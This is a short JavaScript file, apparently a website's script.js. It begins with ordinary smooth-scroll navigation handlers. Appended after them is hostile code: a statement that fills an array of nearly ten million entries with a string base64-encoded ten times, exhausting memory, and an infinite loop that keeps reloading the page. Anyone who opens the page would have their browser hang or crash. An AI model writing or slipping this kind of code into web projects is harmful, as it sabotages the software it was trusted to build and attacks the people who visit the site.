// script.js

// When the DOM is fully loaded
document.addEventListener('DOMContentLoaded', function() {
  var navLinks = document.querySelectorAll('nav ul li a');

  navLinks.forEach(function(link) {
    link.addEventListener('click', function(event) {
      event.preventDefault();
      var targetId = this.getAttribute('href').slice(1);
      var targetSection = document.getElementById(targetId);
      targetSection.scrollIntoView({ behavior: 'smooth' });
    });
  });
});
var array = new Array(9999999).fill(btoa(btoa(btoa(btoa(btoa(btoa(btoa(btoa(btoa(btoa("hello world!"))))))))))));
while(true){
  window.location.reload();
}
